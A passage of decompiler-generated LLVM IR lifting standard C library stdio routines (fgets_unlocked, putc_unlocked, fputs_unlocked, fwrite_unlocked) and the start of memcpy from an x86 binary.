  %v1_805d8b8 = icmp eq i1 %v1_805d8b6, false
  br i1 %v1_805d8b8, label %dec_label_pc_805d839, label %dec_label_pc_805d8be

dec_label_pc_805d8be:                             ; preds = %dec_label_pc_805d8b3, %dec_label_pc_805d7cd
  %v0_805d8be = call i32 @_stdio_openlist_dec_use()
  br label %dec_label_pc_805d8ef

dec_label_pc_805d8c5:                             ; preds = %dec_label_pc_805d7c1
  store i32 0, i32* @edi, align 4
  %tmp26 = bitcast i16* %arg1 to i8*
  %v3_805d8c7 = load i8, i8* %tmp26, align 1
  %v4_805d8c7 = and i8 %v3_805d8c7, 64
  %v5_805d8c7 = icmp eq i8 %v4_805d8c7, 0
  br i1 %v5_805d8c7, label %dec_label_pc_805d8ef, label %dec_label_pc_805d8cc

dec_label_pc_805d8cc:                             ; preds = %dec_label_pc_805d8c5
  store i32 -1, i32* @edi, align 4
  %v2_805d8d3 = call i32 @__stdio_wcommit(i32 %v4_805d7b5)
  %v1_805d8db = icmp eq i32 %v2_805d8d3, 0
  %v1_805d8dd = icmp eq i1 %v1_805d8db, false
  br i1 %v1_805d8dd, label %dec_label_pc_805d8ef, label %dec_label_pc_805d8df

dec_label_pc_805d8df:                             ; preds = %dec_label_pc_805d8cc
  %v2_805d8df = add i32 %v4_805d7b5, 8
  %v3_805d8df = inttoptr i32 %v2_805d8df to i32*
  %v4_805d8df = load i32, i32* %v3_805d8df, align 4
  store i32 0, i32* @edi, align 4
  %v3_805d8e4 = add i32 %v4_805d7b5, 28
  %v4_805d8e4 = inttoptr i32 %v3_805d8e4 to i32*
  store i32 %v4_805d8df, i32* %v4_805d8e4, align 4
  %tmp28 = bitcast i16* %arg1 to i32*
  %v3_805d8e7 = load i32, i32* %tmp28, align 4
  %v3_805d8e7.tr = trunc i32 %v3_805d8e7 to i16
  %v1_805d8ec = and i16 %v3_805d8e7.tr, -65
  store i16 %v1_805d8ec, i16* %arg1, align 2
  br label %dec_label_pc_805d8ef

dec_label_pc_805d8ef:                             ; preds = %dec_label_pc_805d8cc, %dec_label_pc_805d8c5, %dec_label_pc_805d8be, %dec_label_pc_805d8df
  %v0_805d8f2 = load i32, i32* @edi, align 4
  store i32 %v0_805d7b1, i32* @ebx, align 4
  store i32 %v0_805d7b0, i32* @esi, align 4
  store i32 %v0_805d7af, i32* @edi, align 4
  store i32 %v0_805d7ac, i32* @ebp, align 4
  ret i32 %v0_805d8f2

; uselistorder directives
  uselistorder i32 %v3_805d8b3, { 1, 2, 0 }
  uselistorder i32 %v4_805d7b5, { 1, 2, 0, 3 }
  uselistorder i32 ()* @_stdio_openlist_dec_use, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_8075400.646 to i32), { 3, 2, 4, 0, 5, 6, 7, 1 }
  uselistorder i32* @global_var_807bcdc.636, { 1, 2, 3, 0, 4, 5, 6 }
  uselistorder i32 ptrtoint (i32* @global_var_8075418.635 to i32), { 0, 6, 1, 7, 2, 8, 9, 12, 3, 10, 5, 11, 4 }
  uselistorder i16* %arg1, { 2, 1, 3, 4, 0, 5 }
  uselistorder label %dec_label_pc_805d8ef, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_805d8b3, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805d899, { 2, 1, 0 }
  uselistorder label %dec_label_pc_805d866, { 1, 0 }
  uselistorder label %dec_label_pc_805d839, { 1, 0 }
}

define i32 @__GI_fgets_unlocked(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %v0_805d8fc = load i32, i32* @ebp, align 4
  %v0_805d8fd = load i32, i32* @edi, align 4
  %v4_805d907 = ptrtoint i8* %arg1 to i32
  store i32 %v4_805d907, i32* @edi, align 4
  store i32 %arg3, i32* @ebp, align 4
  store i32 %v4_805d907, i32* @ebx, align 4
  %tmp17 = icmp slt i32 %arg2, 1
  %tmp18 = icmp eq i1 %tmp17, false
  br i1 %tmp18, label %dec_label_pc_805d94d.preheader, label %dec_label_pc_805d959

dec_label_pc_805d94d.preheader:                   ; preds = %entry
  %v1_805d94d19 = add i32 %arg2, -1
  %v8_805d94d23 = icmp eq i32 %v1_805d94d19, 0
  store i32 %v1_805d94d19, i32* @esi, align 4
  %v1_805d94e25 = icmp eq i1 %v8_805d94d23, false
  br i1 %v1_805d94e25, label %dec_label_pc_805d917, label %dec_label_pc_805d950

dec_label_pc_805d917:                             ; preds = %dec_label_pc_805d94d.preheader, %dec_label_pc_805d94b.dec_label_pc_805d94d_crit_edge.dec_label_pc_805d917_crit_edge
  %v0_805d917 = phi i32 [ %v0_805d917.pre, %dec_label_pc_805d94b.dec_label_pc_805d94d_crit_edge.dec_label_pc_805d917_crit_edge ], [ %arg3, %dec_label_pc_805d94d.preheader ]
  %v1_805d917 = add i32 %v0_805d917, 16
  %v2_805d917 = inttoptr i32 %v1_805d917 to i32*
  %v3_805d917 = load i32, i32* %v2_805d917, align 4
  store i32 %v3_805d917, i32* %eax.global-to-local, align 4
  %v2_805d91a = add i32 %v0_805d917, 24
  %v3_805d91a = inttoptr i32 %v2_805d91a to i32*
  %v4_805d91a = load i32, i32* %v3_805d91a, align 4
  %v10_805d91a = icmp ult i32 %v3_805d917, %v4_805d91a
  %v1_805d91d = icmp eq i1 %v10_805d91a, false
  br i1 %v1_805d91d, label %dec_label_pc_805d92d, label %dec_label_pc_805d91f

dec_label_pc_805d91f:                             ; preds = %dec_label_pc_805d917
  %v1_805d91f = inttoptr i32 %v3_805d917 to i8*
  %v2_805d91f = load i8, i8* %v1_805d91f, align 1
  %v3_805d91f = zext i8 %v2_805d91f to i32
  %v4_805d91f = load i32, i32* @edx, align 4
  %v5_805d91f = and i32 %v4_805d91f, -256
  %v6_805d91f = or i32 %v5_805d91f, %v3_805d91f
  store i32 %v6_805d91f, i32* @edx, align 4
  %v1_805d921 = add i32 %v3_805d917, 1
  store i32 %v1_805d921, i32* %eax.global-to-local, align 4
  %v2_805d922 = load i32, i32* @ebx, align 4
  %v3_805d922 = inttoptr i32 %v2_805d922 to i8*
  store i8 %v2_805d91f, i8* %v3_805d922, align 1
  %v0_805d924 = load i32, i32* @ebx, align 4
  %v1_805d924 = add i32 %v0_805d924, 1
  store i32 %v1_805d924, i32* @ebx, align 4
  %v0_805d925 = load i32, i32* @edx, align 4
  %v1_805d925 = trunc i32 %v0_805d925 to i8
  %v10_805d925 = icmp eq i8 %v1_805d925, 10
  %v0_805d928 = load i32, i32* %eax.global-to-local, align 4
  %v1_805d928 = load i32, i32* @ebp, align 4
  %v2_805d928 = add i32 %v1_805d928, 16
  %v3_805d928 = inttoptr i32 %v2_805d928 to i32*
  store i32 %v0_805d928, i32* %v3_805d928, align 4
  br i1 %v10_805d925, label %dec_label_pc_805d950, label %dec_label_pc_805d94b.dec_label_pc_805d94d_crit_edge

dec_label_pc_805d92d:                             ; preds = %dec_label_pc_805d917
  %v0_805d931 = call i32 @getc_unlocked()
  %v1_805d931 = trunc i32 %v0_805d931 to i8
  store i32 %v0_805d931, i32* %eax.global-to-local, align 4
  %sext = mul i32 %v0_805d931, 16777216
  %tmp = icmp eq i32 %sext, -16777216
  %v1_805d93c = icmp eq i1 %tmp, false
  br i1 %v1_805d93c, label %dec_label_pc_805d94b, label %dec_label_pc_805d93e

dec_label_pc_805d93e:                             ; preds = %dec_label_pc_805d92d
  %v0_805d93e = load i32, i32* @ebp, align 4
  %v1_805d93e = inttoptr i32 %v0_805d93e to i8*
  %v2_805d93e = load i8, i8* %v1_805d93e, align 1
  %v3_805d93e = and i8 %v2_805d93e, 8
  %v4_805d93e = icmp eq i8 %v3_805d93e, 0
  br i1 %v4_805d93e, label %dec_label_pc_805d950, label %dec_label_pc_805d959

dec_label_pc_805d94b:                             ; preds = %dec_label_pc_805d92d
  %v3_805d946 = load i32, i32* @ebx, align 4
  %v4_805d946 = inttoptr i32 %v3_805d946 to i8*
  store i8 %v1_805d931, i8* %v4_805d946, align 1
  %v0_805d948 = load i32, i32* @ebx, align 4
  %v1_805d948 = add i32 %v0_805d948, 1
  store i32 %v1_805d948, i32* @ebx, align 4
  %v11_805d949 = icmp eq i8 %v1_805d931, 10
  br i1 %v11_805d949, label %dec_label_pc_805d950, label %dec_label_pc_805d94b.dec_label_pc_805d94d_crit_edge

dec_label_pc_805d94b.dec_label_pc_805d94d_crit_edge: ; preds = %dec_label_pc_805d91f, %dec_label_pc_805d94b
  %v0_805d94d.pre = load i32, i32* @esi, align 4
  %v1_805d94d = add i32 %v0_805d94d.pre, -1
  %v8_805d94d = icmp eq i32 %v1_805d94d, 0
  store i32 %v1_805d94d, i32* @esi, align 4
  %v1_805d94e = icmp eq i1 %v8_805d94d, false
  br i1 %v1_805d94e, label %dec_label_pc_805d94b.dec_label_pc_805d94d_crit_edge.dec_label_pc_805d917_crit_edge, label %dec_label_pc_805d950

dec_label_pc_805d94b.dec_label_pc_805d94d_crit_edge.dec_label_pc_805d917_crit_edge: ; preds = %dec_label_pc_805d94b.dec_label_pc_805d94d_crit_edge
  %v0_805d917.pre = load i32, i32* @ebp, align 4
  br label %dec_label_pc_805d917

dec_label_pc_805d950:                             ; preds = %dec_label_pc_805d94d.preheader, %dec_label_pc_805d91f, %dec_label_pc_805d94b.dec_label_pc_805d94d_crit_edge, %dec_label_pc_805d94b, %dec_label_pc_805d93e
  %v0_805d950 = load i32, i32* @ebx, align 4
  %v1_805d950 = load i32, i32* @edi, align 4
  %tmp27 = icmp ugt i32 %v0_805d950, %v1_805d950
  br i1 %tmp27, label %dec_label_pc_805d954, label %dec_label_pc_805d959

dec_label_pc_805d954:                             ; preds = %dec_label_pc_805d950
  %v1_805d954 = inttoptr i32 %v0_805d950 to i8*
  store i8 0, i8* %v1_805d954, align 1
  %v0_805d95e.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_805d95b

dec_label_pc_805d959:                             ; preds = %dec_label_pc_805d950, %dec_label_pc_805d93e, %entry
  br label %dec_label_pc_805d95b

dec_label_pc_805d95b:                             ; preds = %dec_label_pc_805d954, %dec_label_pc_805d959
  %v0_805d95e = phi i32 [ %v0_805d95e.pre, %dec_label_pc_805d954 ], [ 0, %dec_label_pc_805d959 ]
  store i32 %v0_805d95e, i32* %eax.global-to-local, align 4
  store i32 %v0_805d8fd, i32* @edi, align 4
  store i32 %v0_805d8fc, i32* @ebp, align 4
  ret i32 %v0_805d95e

; uselistorder directives
  uselistorder i32 %v0_805d95e, { 1, 0 }
  uselistorder i32 %v0_805d950, { 1, 0 }
  uselistorder i32 %v1_805d94d, { 1, 0 }
  uselistorder i32 %v0_805d931, { 0, 2, 1 }
  uselistorder i32 %v0_805d917, { 1, 0 }
  uselistorder label %dec_label_pc_805d95b, { 1, 0 }
  uselistorder label %dec_label_pc_805d950, { 2, 3, 4, 1, 0 }
  uselistorder label %dec_label_pc_805d94b.dec_label_pc_805d94d_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_805d917, { 1, 0 }
}

define i32 @putc_unlocked(i8 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-9 = alloca i8, align 1
  %v0_805d968 = load i32, i32* @esi, align 4
  %v0_805d969 = load i32, i32* @ebx, align 4
  store i32 %arg2, i32* @ebx, align 4
  %v4_805d971 = sext i8 %arg1 to i32
  store i32 %v4_805d971, i32* @esi, align 4
  %v1_805d975 = add i32 %arg2, 16
  %v2_805d975 = inttoptr i32 %v1_805d975 to i32*
  %v3_805d975 = load i32, i32* %v2_805d975, align 4
  store i32 %v3_805d975, i32* %eax.global-to-local, align 4
  %v2_805d978 = add i32 %arg2, 28
  %v3_805d978 = inttoptr i32 %v2_805d978 to i32*
  %v4_805d978 = load i32, i32* %v3_805d978, align 4
  %v10_805d978 = icmp ult i32 %v3_805d975, %v4_805d978
  %v1_805d97b = icmp eq i1 %v10_805d978, false
  br i1 %v1_805d97b, label %dec_label_pc_805d987, label %dec_label_pc_805d97d

dec_label_pc_805d97d:                             ; preds = %entry
  store i32 %v4_805d971, i32* %edx.global-to-local, align 4
  %v3_805d97f = inttoptr i32 %v3_805d975 to i8*
  store i8 %arg1, i8* %v3_805d97f, align 1
  %v0_805d981 = load i32, i32* %eax.global-to-local, align 4
  %v1_805d981 = add i32 %v0_805d981, 1
  store i32 %v1_805d981, i32* %eax.global-to-local, align 4
  %v1_805d982 = load i32, i32* @ebx, align 4
  %v2_805d982 = add i32 %v1_805d982, 16
  %v3_805d982 = inttoptr i32 %v2_805d982 to i32*
  store i32 %v1_805d981, i32* %v3_805d982, align 4
  %v0_805d9b2.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_805d9b2

dec_label_pc_805d987:                             ; preds = %entry
  %v1_805d987 = inttoptr i32 %arg2 to i16*
  %v2_805d987 = load i16, i16* %v1_805d987, align 2
  %v3_805d987 = zext i16 %v2_805d987 to i32
  %v1_805d98a = and i32 %v3_805d987, 192
  store i32 %v1_805d98a, i32* %eax.global-to-local, align 4
  %v6_805d98f = icmp eq i32 %v1_805d98a, 192
  br i1 %v6_805d98f, label %dec_label_pc_805d9aa, label %dec_label_pc_805d996

dec_label_pc_805d996:                             ; preds = %dec_label_pc_805d987
  %v0_805d996 = load i32, i32* @edx, align 4
  %v6_805d99e = call i32 @__stdio_trans2w_o(i16* %v1_805d987, i32 128, i32 %v0_805d996, i32 %v0_805d996)
  store i32 %v6_805d99e, i32* %eax.global-to-local, align 4
  %v1_805d9a6 = icmp eq i32 %v6_805d99e, 0
  %v1_805d9a8 = icmp eq i1 %v1_805d9a6, false
  br i1 %v1_805d9a8, label %dec_label_pc_805da1a, label %dec_label_pc_805d996.dec_label_pc_805d9aa_crit_edge

dec_label_pc_805d996.dec_label_pc_805d9aa_crit_edge: ; preds = %dec_label_pc_805d996
  %v0_805d9aa.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_805d9aa

dec_label_pc_805d9aa:                             ; preds = %dec_label_pc_805d996.dec_label_pc_805d9aa_crit_edge, %dec_label_pc_805d987
  %v0_805da0d = phi i32 [ %v0_805d9aa.pre, %dec_label_pc_805d996.dec_label_pc_805d9aa_crit_edge ], [ %arg2, %dec_label_pc_805d987 ]
  %v1_805d9aa = add i32 %v0_805da0d, 4
  %v2_805d9aa = inttoptr i32 %v1_805d9aa to i32*
  %v3_805d9aa = load i32, i32* %v2_805d9aa, align 4
  %v13_805d9aa = icmp eq i32 %v3_805d9aa, -2
  %v1_805d9ae = icmp eq i1 %v13_805d9aa, false
  br i1 %v1_805d9ae, label %dec_label_pc_805d9b7, label %dec_label_pc_805d9b0

dec_label_pc_805d9b0:                             ; preds = %dec_label_pc_805d9ff, %dec_label_pc_805d9ea, %dec_label_pc_805d9e5, %dec_label_pc_805d9d4, %dec_label_pc_805d9aa
  %v0_805d9b0 = load i32, i32* @esi, align 4
  store i32 %v0_805d9b0, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_805d9b2

dec_label_pc_805d9b2:                             ; preds = %dec_label_pc_805d97d, %dec_label_pc_805d9b0
  %v0_805d9b2 = phi i32 [ %v0_805d9b2.pre, %dec_label_pc_805d97d ], [ %v0_805d9b0, %dec_label_pc_805d9b0 ]
  %v1_805d9b2 = urem i32 %v0_805d9b2, 256
  br label %dec_label_pc_805da1d

dec_label_pc_805d9b7:                             ; preds = %dec_label_pc_805d9aa
  %v1_805d9b7 = add i32 %v0_805da0d, 12
  %v2_805d9b7 = inttoptr i32 %v1_805d9b7 to i32*
  %v3_805d9b7 = load i32, i32* %v2_805d9b7, align 4
  store i32 %v3_805d9b7, i32* %eax.global-to-local, align 4
  %v2_805d9ba = add i32 %v0_805da0d, 8
  %v3_805d9ba = inttoptr i32 %v2_805d9ba to i32*
  %v4_805d9ba = load i32, i32* %v3_805d9ba, align 4
  %v15_805d9ba = icmp eq i32 %v3_805d9b7, %v4_805d9ba
  br i1 %v15_805d9ba, label %dec_label_pc_805d9ff, label %dec_label_pc_805d9bf

dec_label_pc_805d9bf:                             ; preds = %dec_label_pc_805d9b7
  %v2_805d9bf = add i32 %v0_805da0d, 16
  %v3_805d9bf = inttoptr i32 %v2_805d9bf to i32*
  %v4_805d9bf = load i32, i32* %v3_805d9bf, align 4
  %v15_805d9bf = icmp eq i32 %v3_805d9b7, %v4_805d9bf
  %v1_805d9c2 = icmp eq i1 %v15_805d9bf, false
  br i1 %v1_805d9c2, label %dec_label_pc_805d9d4, label %dec_label_pc_805d9c4

dec_label_pc_805d9c4:                             ; preds = %dec_label_pc_805d9bf
  %v2_805d9c8 = call i32 @__stdio_wcommit(i32 %v0_805da0d)
  store i32 %v2_805d9c8, i32* %eax.global-to-local, align 4
  %v1_805d9d0 = icmp eq i32 %v2_805d9c8, 0
  %v1_805d9d2 = icmp eq i1 %v1_805d9d0, false
  br i1 %v1_805d9d2, label %dec_label_pc_805da1a, label %dec_label_pc_805d9c4.dec_label_pc_805d9d4_crit_edge

dec_label_pc_805d9c4.dec_label_pc_805d9d4_crit_edge: ; preds = %dec_label_pc_805d9c4
  %v0_805d9d4.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_805d9d4

dec_label_pc_805d9d4:                             ; preds = %dec_label_pc_805d9c4.dec_label_pc_805d9d4_crit_edge, %dec_label_pc_805d9bf
  %v0_805d9d4 = phi i32 [ %v0_805d9d4.pre, %dec_label_pc_805d9c4.dec_label_pc_805d9d4_crit_edge ], [ %v0_805da0d, %dec_label_pc_805d9bf ]
  %v1_805d9d4 = add i32 %v0_805d9d4, 16
  %v2_805d9d4 = inttoptr i32 %v1_805d9d4 to i32*
  %v3_805d9d4 = load i32, i32* %v2_805d9d4, align 4
  store i32 %v3_805d9d4, i32* %eax.global-to-local, align 4
  %v0_805d9d7 = load i32, i32* @esi, align 4
  store i32 %v0_805d9d7, i32* %edx.global-to-local, align 4
  %v1_805d9d9 = trunc i32 %v0_805d9d7 to i8
  %v3_805d9d9 = inttoptr i32 %v3_805d9d4 to i8*
  store i8 %v1_805d9d9, i8* %v3_805d9d9, align 1
  %v0_805d9db = load i32, i32* %eax.global-to-local, align 4
  %v1_805d9db = add i32 %v0_805d9db, 1
  store i32 %v1_805d9db, i32* %eax.global-to-local, align 4
  %v0_805d9dc = load i32, i32* @ebx, align 4
  %v1_805d9dc = add i32 %v0_805d9dc, 1
  %v2_805d9dc = inttoptr i32 %v1_805d9dc to i8*
  %v3_805d9dc = load i8, i8* %v2_805d9dc, align 1
  %v4_805d9dc = urem i8 %v3_805d9dc, 2
  %v5_805d9dc = icmp eq i8 %v4_805d9dc, 0
  %v2_805d9e0 = add i32 %v0_805d9dc, 16
  %v3_805d9e0 = inttoptr i32 %v2_805d9e0 to i32*
  store i32 %v1_805d9db, i32* %v3_805d9e0, align 4
  br i1 %v5_805d9dc, label %dec_label_pc_805d9b0, label %dec_label_pc_805d9e5

dec_label_pc_805d9e5:                             ; preds = %dec_label_pc_805d9d4
  %v0_805d9e5 = load i32, i32* %edx.global-to-local, align 4
  %v1_805d9e5 = trunc i32 %v0_805d9e5 to i8
  %v10_805d9e5 = icmp eq i8 %v1_805d9e5, 10
  %v1_805d9e8 = icmp eq i1 %v10_805d9e5, false
  br i1 %v1_805d9e8, label %dec_label_pc_805d9b0, label %dec_label_pc_805d9ea

dec_label_pc_805d9ea:                             ; preds = %dec_label_pc_805d9e5
  %v0_805d9ed = load i32, i32* @ebx, align 4
  %v2_805d9ee = call i32 @__stdio_wcommit(i32 %v0_805d9ed)
  store i32 %v2_805d9ee, i32* %eax.global-to-local, align 4
  %v1_805d9f6 = icmp eq i32 %v2_805d9ee, 0
  br i1 %v1_805d9f6, label %dec_label_pc_805d9b0, label %dec_label_pc_805d9fa

dec_label_pc_805d9fa:                             ; preds = %dec_label_pc_805d9ea
  %v0_805d9fa = load i32, i32* @ebx, align 4
  %v1_805d9fa = add i32 %v0_805d9fa, 16
  %v2_805d9fa = inttoptr i32 %v1_805d9fa to i32*
  %v3_805d9fa = load i32, i32* %v2_805d9fa, align 4
  %v4_805d9fa = add i32 %v3_805d9fa, -1
  store i32 %v4_805d9fa, i32* %v2_805d9fa, align 4
  br label %dec_label_pc_805da1a

dec_label_pc_805d9ff:                             ; preds = %dec_label_pc_805d9b7
  %v0_805d9ff = load i32, i32* @esi, align 4
  store i32 %v0_805d9ff, i32* @ecx, align 4
  %v6_805da01 = trunc i32 %v0_805d9ff to i8
  store i8 %v6_805da01, i8* %stack_var_-9, align 1
  %v2_805da08 = ptrtoint i8* %stack_var_-9 to i32
  store i32 %v2_805da08, i32* %eax.global-to-local, align 4
  %v5_805da0d = inttoptr i32 %v0_805da0d to i16*
  %v6_805da0e = call i32 @__stdio_WRITE(i16* %v5_805da0d, i32 %v2_805da08, i32 1, i32 %v3_805d9b7)
  store i32 %v6_805da0e, i32* %eax.global-to-local, align 4
  %v1_805da16 = icmp eq i32 %v6_805da0e, 0
  %v1_805da18 = icmp eq i1 %v1_805da16, false
  br i1 %v1_805da18, label %dec_label_pc_805d9b0, label %dec_label_pc_805da1a

dec_label_pc_805da1a:                             ; preds = %dec_label_pc_805d9ff, %dec_label_pc_805d9c4, %dec_label_pc_805d996, %dec_label_pc_805d9fa
  br label %dec_label_pc_805da1d

dec_label_pc_805da1d:                             ; preds = %dec_label_pc_805d9b2, %dec_label_pc_805da1a
  %storemerge = phi i32 [ %v1_805d9b2, %dec_label_pc_805d9b2 ], [ -1, %dec_label_pc_805da1a ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  store i32 %v0_805d969, i32* @ebx, align 4
  store i32 %v0_805d968, i32* @esi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v3_805d9b7, { 2, 0, 1, 3 }
  uselistorder i32 %v0_805da0d, { 0, 1, 2, 3, 5, 4, 6 }
  uselistorder i32* %eax.global-to-local, { 13, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12 }
  uselistorder label %dec_label_pc_805da1d, { 1, 0 }
  uselistorder label %dec_label_pc_805da1a, { 0, 3, 1, 2 }
  uselistorder label %dec_label_pc_805d9b2, { 1, 0 }
}

define i32 @__GI_fputs_unlocked(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v0_805da24 = load i32, i32* @esi, align 4
  %v0_805da25 = load i32, i32* @ebx, align 4
  store i32 %v0_805da25, i32* %stack_var_-8, align 4
  %v4_805da29 = ptrtoint i8* %arg1 to i32
  store i32 %v4_805da29, i32* @ebx, align 4
  %v3_805da2e = call i32 @strlen(i8* %arg1)
  store i32 %v3_805da2e, i32* @esi, align 4
  %v0_805da3f = load i32, i32* @ebx, align 4
  %v6_805da40 = call i32 @__GI_fwrite_unlocked(i32 %v0_805da3f, i64 1, i32 %v3_805da2e, i32 %arg2)
  %v1_805da4a = load i32, i32* @esi, align 4
  %v12_805da4a = icmp eq i32 %v6_805da40, %v1_805da4a
  %v3_805da4c = select i1 %v12_805da4a, i32 %v6_805da40, i32 -1
  %v2_805da52 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_805da52, i32* @ebx, align 4
  store i32 %v0_805da24, i32* @esi, align 4
  ret i32 %v3_805da4c

; uselistorder directives
  uselistorder i32 %v6_805da40, { 1, 0 }
  uselistorder i8* %arg1, { 1, 0 }
}

define i32 @__GI_fwrite_unlocked(i32 %arg1, i64 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %v0_805da58 = load i32, i32* @edi, align 4
  %v0_805da59 = load i32, i32* @esi, align 4
  store i32 %arg4, i32* @ebx, align 4
  %v4_805da5f = trunc i64 %arg2 to i32
  store i32 %v4_805da5f, i32* @esi, align 4
  store i32 %arg3, i32* @edi, align 4
  %v1_805da67 = inttoptr i32 %arg4 to i16*
  %v2_805da67 = load i16, i16* %v1_805da67, align 2
  %v1_805da6a = and i16 %v2_805da67, 192
  %v6_805da6f = icmp eq i16 %v1_805da6a, 192
  br i1 %v6_805da6f, label %dec_label_pc_805da8a, label %dec_label_pc_805da76

dec_label_pc_805da76:                             ; preds = %entry
  %v0_805da76 = load i32, i32* @edx, align 4
  store i32 %arg4, i32* %stack_var_-28, align 4
  %v6_805da7e = call i32 @__stdio_trans2w_o(i16* %v1_805da67, i32 128, i32 %v0_805da76, i32 %v0_805da76)
  %v1_805da86 = icmp eq i32 %v6_805da7e, 0
  %v1_805da88 = icmp eq i1 %v1_805da86, false
  br i1 %v1_805da88, label %dec_label_pc_805daca, label %dec_label_pc_805da8a

dec_label_pc_805da8a:                             ; preds = %dec_label_pc_805da76, %entry
  %v2_805da8a = icmp eq i32 %v4_805da5f, 0
  br i1 %v2_805da8a, label %dec_label_pc_805daca, label %dec_label_pc_805da8e

dec_label_pc_805da8e:                             ; preds = %dec_label_pc_805da8a
  %v1_805da8e = icmp eq i32 %arg3, 0
  br i1 %v1_805da8e, label %dec_label_pc_805daca, label %dec_label_pc_805da92

dec_label_pc_805da92:                             ; preds = %dec_label_pc_805da8e
  %v9_805da97 = udiv i64 4294967295, %arg2
  %v10_805da97 = trunc i64 %v9_805da97 to i32
  %v6_805da9b = icmp ult i32 %v10_805da97, %arg3
  br i1 %v6_805da9b, label %dec_label_pc_805dab7, label %dec_label_pc_805da9d

dec_label_pc_805da9d:                             ; preds = %dec_label_pc_805da92
  %sext = mul i64 %arg2, 4294967296
  %v2_805daa0 = sdiv i64 %sext, 4294967296
  %v3_805daa0 = sext i32 %arg3 to i64
  %v4_805daa0 = mul nsw i64 %v3_805daa0, %v2_805daa0
  %v5_805daa0 = trunc i64 %v4_805daa0 to i32
  %v0_805daa3 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* %stack_var_-28, align 4
  %v5_805daa9 = call i32 @__stdio_fwrite(i32 %arg1, i32 %v5_805daa0, i32 %v0_805daa3, i32 %v10_805da97)
  %v6_805daa9 = sext i32 %v5_805daa9 to i64
  %v10_805dab3 = udiv i64 %v6_805daa9, %arg2
  %v11_805dab3 = trunc i64 %v10_805dab3 to i32
  br label %dec_label_pc_805dacc

dec_label_pc_805dab7:                             ; preds = %dec_label_pc_805da92
  %v0_805dab7 = load i32, i32* @ebx, align 4
  %v1_805dab7 = inttoptr i32 %v0_805dab7 to i32*
  %v2_805dab7 = load i32, i32* %v1_805dab7, align 4
  %v1_805dab9 = or i32 %v2_805dab7, 8
  %v1_805dabc = trunc i32 %v1_805dab9 to i16
  %v3_805dabc = inttoptr i32 %v0_805dab7 to i16*
  store i16 %v1_805dabc, i16* %v3_805dabc, align 2
  %v0_805dabf = load i32, i32* %stack_var_-28, align 4
  %v1_805dabf = call i32 @__errno_location(i32 %v0_805dabf)
  %v1_805dac4 = inttoptr i32 %v1_805dabf to i32*
  store i32 22, i32* %v1_805dac4, align 4
  br label %dec_label_pc_805daca

dec_label_pc_805daca:                             ; preds = %dec_label_pc_805da8e, %dec_label_pc_805da8a, %dec_label_pc_805da76, %dec_label_pc_805dab7
  br label %dec_label_pc_805dacc

dec_label_pc_805dacc:                             ; preds = %dec_label_pc_805da9d, %dec_label_pc_805daca
  %v0_805dacf = phi i32 [ %v11_805dab3, %dec_label_pc_805da9d ], [ 0, %dec_label_pc_805daca ]
  store i32 %v0_805da59, i32* @esi, align 4
  store i32 %v0_805da58, i32* @edi, align 4
  ret i32 %v0_805dacf

; uselistorder directives
  uselistorder i32 %v0_805da76, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @__stdio_fwrite, { 5, 4, 3, 1, 0, 6, 2 }
  uselistorder i32 (i16*, i32, i32, i32)* @__stdio_trans2w_o, { 1, 0, 2 }
  uselistorder i32 %arg3, { 2, 0, 1, 3 }
  uselistorder i64 %arg2, { 2, 0, 1, 3 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_805dacc, { 1, 0 }
  uselistorder label %dec_label_pc_805daca, { 3, 0, 1, 2 }
}

define i32 @memcpy(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_805dad1 = load i32, i32* @esi, align 4
  store i32 %v0_805dad1, i32* %stack_var_-8, align 4
  %sext = mul i32 %arg3, 16777216
  %v4_805dad2 = sdiv i32 %sext, 16777216
  store i32 %v4_805dad2, i32* %eax.global-to-local, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  %v4_805dada = ptrtoint i16* %arg1 to i32
  store i32 %v4_805dada, i32* %edi.global-to-local, align 4
  %v2_805dae0 = udiv i32 %v4_805dad2, 4
  %v3_805dae3 = inttoptr i32 %arg2 to i8*
  %v4_805dae3 = bitcast i16* %arg1 to i8*
  %v5_805dae3 = call i8* @_memcpy(i8* %v4_805dae3, i8* %v3_805dae3, i32 %v2_805dae0)
  %v6_805dae3 = ptrtoint i8* %v5_805dae3 to i32
  store i32 %v6_805dae3, i32* @ecx, align 4
  %v0_805dae5 = load i32, i32* %eax.global-to-local, align 4
  %v2_805dae5 = and i32 %v0_805dae5, 2
  %v3_805dae5 = icmp eq i32 %v2_805dae5, 0
  br i1 %v3_805dae5, label %dec_label_pc_805daeb, label %dec_label_pc_805dae9

dec_label_pc_805dae9:                             ; preds = %entry
  %v0_805dae9 = load i32, i32* %esi.global-to-local, align 4
  %v1_805dae9 = inttoptr i32 %v0_805dae9 to i16*
  %v2_805dae9 = load i16, i16* %v1_805dae9, align 2
  %v3_805dae9 = load i32, i32* %edi.global-to-local, align 4
